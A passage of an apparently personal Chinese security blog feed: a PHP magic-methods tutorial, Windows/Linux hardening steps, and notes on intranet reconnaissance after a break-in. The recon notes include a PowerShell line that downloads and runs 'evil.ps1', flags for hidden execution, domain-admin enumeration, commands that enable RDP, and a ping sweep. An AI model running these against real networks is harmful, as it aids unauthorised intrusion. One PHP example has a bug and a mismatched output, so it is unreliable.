    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">PHP: 魔术方法 - Manual</a></p><ul><li>php 魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作</li></ul><h1 id="construct-构造函数"><a href="#construct-构造函数" class="headerlink" title="__construct() 构造函数"></a><code>__construct()</code> 构造函数</h1><ul><li>通常构造方法被用来<em>执行一些有用的初始化任务</em>，如对成员属性在创建对象时赋予初始值</li><li>在每个类中都有一个构造方法，<em>如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法</em><span id="more"></span></li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$sex</span> = <span class="string">&quot;男&quot;</span>, <span class="variable">$age</span> = <span class="number">22</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我叫：&quot;</span>.this-&gt;name.<span class="string">&quot;，性别：&quot;</span>.<span class="variable language_">$this</span>-&gt;sex.<span class="string">&quot;，年龄：&quot;</span>.<span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Person</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">我叫：张三，性别：男，年龄：<span class="number">22</span></span><br></pre></td></tr></table></figure><h1 id="destruct-析构函数"><a href="#destruct-析构函数" class="headerlink" title="__destruct() 析构函数"></a><code>__destruct()</code> 析构函数</h1><ul><li>php 的执行工作流是当前端进程调用后端的 php 程序阶段性完成时（例如页面加载完成，调用 php 也结束了），其中类就会逐一销毁，而<em>该函数可以在销毁之前执行一些关闭文件，释放内存等结束性操作</em></li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;waiting!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$Person</span>); <span class="comment">//手动销毁Person对象，注意这个不是__unset()重载方法</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">waiting!</span><br></pre></td></tr></table></figure><h1 id="重载方法"><a href="#重载方法" class="headerlink" title="重载方法"></a>重载方法</h1><h2 id="属性重载"><a href="#属性重载" class="headerlink" title="属性重载"></a>属性重载</h2><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a><code>__set()</code></h3><ul><li>在给不可访问（ <strong>protected</strong> 或 <strong>private</strong> ）或不存在的属性赋值时，<code>__set()</code> 会被调用。</li></ul><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a><code>__get()</code></h3><ul><li>读取不可访问（ <strong>protected</strong> 或 <strong>private</strong> ）或不存在的属性的值时，__get()会被调用。</li></ul><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a><code>__isset()</code></h3><ul><li>当对不可访问（ <strong>protected</strong> 或 <strong>private</strong> ）或不存在的属性调用 <code>isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用。</li></ul><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a><code>__unset()</code></h3><ul><li>当对不可访问（ <strong>protected</strong> 或 <strong>private</strong> ）或不存在的属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用。</li></ul><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a><code>__call()</code></h3><p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。</p><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a><code>__callStatic()</code></h3><p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。</p><h1 id="toString-被当作字符串时调用方法"><a href="#toString-被当作字符串时调用方法" class="headerlink" title="__toString() 被当作字符串时调用方法"></a><code>__toString()</code> 被当作字符串时调用方法</h1><ul><li>该方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。<br>例如：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 声明一个简单的类  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$foo</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$foo</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;foo = <span class="variable">$foo</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;foo;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>(<span class="string">&#x27;Hello&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">Hello</span><br></pre></td></tr></table></figure></li></ul><h1 id="invoke-方法"><a href="#invoke-方法" class="headerlink" title="__invoke() 方法"></a><code>__invoke()</code> 方法</h1><ul><li><em>当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</em></li></ul><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallableClass</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">CallableClass</span>;  </span><br><span class="line"><span class="variable">$obj</span>(<span class="number">5</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_callable</span>(<span class="variable">$obj</span>));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="keyword">int</span>(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><h1 id="sleep-序列化特指方法"><a href="#sleep-序列化特指方法" class="headerlink" title="__sleep() 序列化特指方法"></a><code>__sleep()</code> 序列化特指方法</h1><p>![[php 序列化及反序列化#序列化特别的魔术方法- <code>__sleep()</code>]]</p><h1 id="wakeup-反序列化变更方法"><a href="#wakeup-反序列化变更方法" class="headerlink" title="__wakeup() 反序列化变更方法"></a><code>__wakeup()</code> 反序列化变更方法</h1><p>![[php 序列化及反序列化#反序列化特别的魔术方法- <code>__wakeup()</code>]]</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring&quot;&gt;PHP: 魔术方法 - Manual&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;php 魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;construct-构造函数&quot;&gt;&lt;a href=&quot;#construct-构造函数&quot; class=&quot;headerlink&quot; title=&quot;__construct() 构造函数&quot;&gt;&lt;/a&gt;&lt;code&gt;__construct()&lt;/code&gt; 构造函数&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;通常构造方法被用来&lt;em&gt;执行一些有用的初始化任务&lt;/em&gt;，如对成员属性在创建对象时赋予初始值&lt;/li&gt;
&lt;li&gt;在每个类中都有一个构造方法，&lt;em&gt;如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="TechLearning" scheme="https://resek4.github.io/categories/TechLearning/"/>
    
    
  </entry>
  
  <entry>
    <title>简述 Windows 及 Linux 平台服务的安全加固</title>
    <link href="https://resek4.github.io/2021/07/03/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>https://resek4.github.io/2021/07/03/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</id>
    <published>2021-07-02T16:00:00.000Z</published>
    <updated>2023-02-26T05:25:33.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web-安全加固"><a href="#Web-安全加固" class="headerlink" title="Web 安全加固"></a>Web 安全加固</h1><h2 id="防止-web-中-mdb-数据库文件非法下载"><a href="#防止-web-中-mdb-数据库文件非法下载" class="headerlink" title="防止 web 中.mdb 数据库文件非法下载"></a>防止 web 中.mdb 数据库文件非法下载</h2><p>管理工具-&gt;IIS 管理器-&gt;网站-&gt;Default Web Site-&gt;请求筛选-&gt;右键文件拓展名-&gt;拒绝文件拓展名，添加拓展名.mdb<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/qfqi.png?token=AEZI7DOL5RFNYW5M5QRSXT3C6RBRE"></p><span id="more"></span><h2 id="限制目录执行权限-对-picture-和-upload-目录设置执行权限为无"><a href="#限制目录执行权限-对-picture-和-upload-目录设置执行权限为无" class="headerlink" title="限制目录执行权限,对 picture 和 upload 目录设置执行权限为无"></a>限制目录执行权限,对 picture 和 upload 目录设置执行权限为无</h2><p>管理工具-&gt;IIS 管理器-&gt;网站-&gt;web-&gt;picture&#x2F;upload-&gt;处理程序映射，右键空白处-&gt;编辑功能权限，取消勾选执行<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/wvdsav.png?token=AEZI7DPWI237XE666U3DYK3C6RBR6"></p><h2 id="开启-IIS-的日志审计记录-日志文件保存格式为-W3C-只记录日期、时间、客户端-IP-地址、用户名、方法"><a href="#开启-IIS-的日志审计记录-日志文件保存格式为-W3C-只记录日期、时间、客户端-IP-地址、用户名、方法" class="headerlink" title="开启 IIS 的日志审计记录(日志文件保存格式为 W3C,只记录日期、时间、客户端 IP 地址、用户名、方法)"></a>开启 IIS 的日志审计记录(日志文件保存格式为 W3C,只记录日期、时间、客户端 IP 地址、用户名、方法)</h2><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xzcvxi.png?token=AEZI7DPBSQKZCH2XVLWPM2DC6RBSW"><br>管理工具-&gt;IIS 管理器-&gt;网站-&gt;web-&gt;日志，格式选择 W3C，点击选择字段，只勾选日期、时间、客户端 IP 地址、用户名、方法</p><h2 id="为了减轻网站负载，设置网站最大并发连接数为-1000"><a href="#为了减轻网站负载，设置网站最大并发连接数为-1000" class="headerlink" title="为了减轻网站负载，设置网站最大并发连接数为 1000"></a>为了减轻网站负载，设置网站最大并发连接数为 1000</h2><p>管理工具-&gt;IIS 管理器-&gt;网站-&gt;，右侧-设置网站默认设置，设置限制连接数值为 1000<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xczvap.png?token=AEZI7DLNZ5GCKMCEVXH6TOTC6RBTK"></p><h2 id="防止文件枚举漏洞枚举网络服务器根目录文件，禁止-IIS-短文件名泄露"><a href="#防止文件枚举漏洞枚举网络服务器根目录文件，禁止-IIS-短文件名泄露" class="headerlink" title="防止文件枚举漏洞枚举网络服务器根目录文件，禁止 IIS 短文件名泄露"></a>防止文件枚举漏洞枚举网络服务器根目录文件，禁止 IIS 短文件名泄露</h2><p>CMD 执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsutil behavior set disable8dot3 1</span><br></pre></td></tr></table></figure><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/qwiughvqiu.png?token=AEZI7DNPFSRLET7RG7MPSBLC6RBT2"></p><h2 id="关闭-IIS-的-WebDAV-功能增强网站的安全性"><a href="#关闭-IIS-的-WebDAV-功能增强网站的安全性" class="headerlink" title="关闭 IIS 的 WebDAV 功能增强网站的安全性"></a>关闭 IIS 的 WebDAV 功能增强网站的安全性</h2><p>管理工具-&gt;IIS 管理器-&gt;主机名(WIN-242GA01GJ9K)-&gt;ISAPI 和 CGI 限制,右键 WebDav,点击拒绝</p><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/qiwufhdisuhf.png?token=AEZI7DLCOYXVWAWYG6ZFBBDC6RBUQ"><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/cxzvhjaio.png?token=AEZI7DN6PSUDTZN2XCGWWKLC6RBVE"></p><h1 id="服务加固与防火墙策略"><a href="#服务加固与防火墙策略" class="headerlink" title="服务加固与防火墙策略"></a>服务加固与防火墙策略</h1><p>参考 <a href="https://freeaes.com/2020/11/06/1/#%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E5%AF%86%E7%A0%81%E5%9C%A8%E7%99%BB%E9%99%86%E6%88%96%E8%80%85%E4%BC%A0%E8%BE%93%E4%BF%A1%E6%81%AF%E4%B8%AD%E8%A2%AB%E7%AA%83%E5%8F%96%EF%BC%8C%E4%BB%85%E4%BD%BF%E7%94%A8%E8%AF%81%E4%B9%A6%E7%99%BB%E9%99%86SSH">服务加固与防火墙策略</a></p><h1 id="主机加固"><a href="#主机加固" class="headerlink" title="主机加固"></a>主机加固</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>1.修改 ssh 的配置文件，禁止 root 直接登录</p><p>2.修改密码策略配置文件，确保密码最小长度为 8 位</p><p>3.确保错误登录 3 次，锁定此账户 5 分钟</p><p>4.禁止 su 非法[[提权]]，只允许 root 和 wheel 组用户 su 到 root</p><p>5.不响应 ICMP 请求</p><p>6.设置登陆超时时间为 10 分钟</p><ol start="7"><li>结束非法登录用户</li></ol><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ol><li><p>修改 3389 端口</p></li><li><p>设置安全策略，不允许 SAM 帐户的匿名枚举，不允许 SAM 帐户和共享的匿名枚举</p></li><li><p>在组策略中设置阻止访问注册表编辑工具</p></li><li><p>开启审核对象访问，成功与失败；开启审核目录服务访问，成功与失败；开启审核系统事件，成功与失败</p></li><li><p>禁止 445 端口漏洞</p></li><li><p>设置屏幕保护在恢复时使用密码保护</p></li><li><p>设置 windows 密码策略：使密码必须满足复杂性，设置密码长度最小值为 8 位，设置密码最长存留期为 30 天</p></li><li><p>开启 Windows 防火墙，关闭 ping 服务，打开 3389、80 等服务</p></li><li><p>关闭系统默认共享</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Web-安全加固&quot;&gt;&lt;a href=&quot;#Web-安全加固&quot; class=&quot;headerlink&quot; title=&quot;Web 安全加固&quot;&gt;&lt;/a&gt;Web 安全加固&lt;/h1&gt;&lt;h2 id=&quot;防止-web-中-mdb-数据库文件非法下载&quot;&gt;&lt;a href=&quot;#防止-web-中-mdb-数据库文件非法下载&quot; class=&quot;headerlink&quot; title=&quot;防止 web 中.mdb 数据库文件非法下载&quot;&gt;&lt;/a&gt;防止 web 中.mdb 数据库文件非法下载&lt;/h2&gt;&lt;p&gt;管理工具-&amp;gt;IIS 管理器-&amp;gt;网站-&amp;gt;Default Web Site-&amp;gt;请求筛选-&amp;gt;右键文件拓展名-&amp;gt;拒绝文件拓展名，添加拓展名.mdb&lt;br&gt;&lt;img src=&quot;https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/qfqi.png?token=AEZI7DOL5RFNYW5M5QRSXT3C6RBRE&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Penetration" scheme="https://resek4.github.io/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>简易内网信息收集</title>
    <link href="https://resek4.github.io/2021/06/11/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://resek4.github.io/2021/06/11/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-06-10T16:00:00.000Z</published>
    <updated>2023-01-27T09:23:53.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="辅助命令"><a href="#辅助命令" class="headerlink" title="辅助命令"></a>辅助命令</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 隐藏窗口</span></span><br><span class="line">-W Hidden</span><br><span class="line">-WindowStyle Hidden</span><br><span class="line"></span><br><span class="line"><span class="comment">//非交互模式，不为用户提供交互提示</span></span><br><span class="line">-NonI</span><br><span class="line">-NonInteractive</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用IEX（Invoke-Expression）进行远程脚本下载</span></span><br><span class="line">-IEX(New-ObjectNet.WebClient).DownloadString(<span class="string">&quot;127.0.0.1/evil.ps1&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">//不加载当前用户的配置文件</span></span><br><span class="line">-NoP</span><br><span class="line">-NoProfile</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示logo的启动</span></span><br><span class="line">-NoLogo</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行后不退出shell，常用于键盘记录等</span></span><br><span class="line">-noexit</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="宗旨"><a href="#宗旨" class="headerlink" title="宗旨"></a>宗旨</h2><p>进入内网的“黑暗森林”后，需要有个大致的判断：</p><ol><li>我是谁（whoami 等）</li><li>这个机子都有谁，有[[域]]吗，域的账户都有啥（重点关注 3 本地组管理员与全局组管理员），域控的 ip 域机器名是啥</li><li>本机信息收集</li><li>我的域有其他存活的机子吗，都开放了什么端口</li><li>确定域管理员、本地管理员都有谁，登录本台机器的都有谁（有没有域管理员）</li><li>当前域控下的活动域都有哪些</li></ol><h2 id="杂余命令"><a href="#杂余命令" class="headerlink" title="杂余命令"></a>杂余命令</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查看当前权限</span></span><br><span class="line">whoami</span><br><span class="line">whoami /all <span class="comment">//可以获取域SID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查看完整IP信息</span></span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看系统信息</span></span><br><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /b /c:<span class="string">&quot;OS&quot;</span></span><br><span class="line">echo %PROCESSOR_ARCHITECTURE% <span class="comment">//或者%PATH%啥的，反正是环境变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询端口列表</span></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看计划任务</span></span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用telnet逐一验证高危端口是否开启</span></span><br><span class="line">telnet DC <span class="number">22</span></span><br><span class="line">telnet DC <span class="number">1443</span></span><br><span class="line">telnet <span class="number">1.2</span><span class="number">.3</span><span class="number">.4</span> <span class="number">3389</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询路由表</span></span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询所有可用接口的ARP缓存表</span></span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看域控的机器名</span></span><br><span class="line">nltest /DCLIST:hacke</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看域控的主机名</span></span><br><span class="line">nslookup -type=SRV _ldap._tcp</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看代理配置情况</span></span><br><span class="line">reg query <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查询远程连接端口（0xd3d就是3389）</span></span><br><span class="line">REG QUERY <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&quot;</span> /V PortNumber</span><br><span class="line"></span><br><span class="line"><span class="comment">//在Windows Server 2003中开启3389</span></span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=<span class="string">&quot;&quot;</span>) call setallowsconnections <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在Windows Server 2008和Windows Ser ver 2012中开启3389（以下三选一）</span></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=<span class="string">&quot;&quot;</span>) call setallowtsconnections <span class="number">1</span></span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=<span class="string">&quot;RDP-Tcp&quot;</span>) call setuserauthenticationrequired <span class="number">1</span></span><br><span class="line"></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot;</span> /v fSingleSessionPerUser /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断当前域控下活动域都有哪些</span></span><br><span class="line"><span class="comment">//将域控机器名放在dcs.txt中，域管理员放到admins.txt中</span></span><br><span class="line">FOR /F %I in (dcs.txt) <span class="keyword">do</span> @echo [+] Querying DC %I &amp;&amp; @netsess -h %I <span class="number">2</span>&gt;nul &gt;sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | findstr /I %a</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过ping的ICMP协议进行主机探测</span></span><br><span class="line"><span class="keyword">for</span> /L %I in (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO @ping  -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192.168</span><span class="number">.1</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span></span><br></pre></td></tr></table></figure><h2 id="net-命令"><a href="#net-命令" class="headerlink" title="net 命令"></a>net 命令</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查看域里的各种基本信息</span></span><br><span class="line"><span class="comment">//加domain就是域内操作，会直接将命令放到域控上执行</span></span><br><span class="line">net group /domain</span><br><span class="line">net user /domain</span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain <span class="comment">//可以在后面加身份来具体查询</span></span><br><span class="line">net localgroup  <span class="comment">//本地组 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在域内机器上net group /domain 等同于在域控上 net group</span></span><br><span class="line"><span 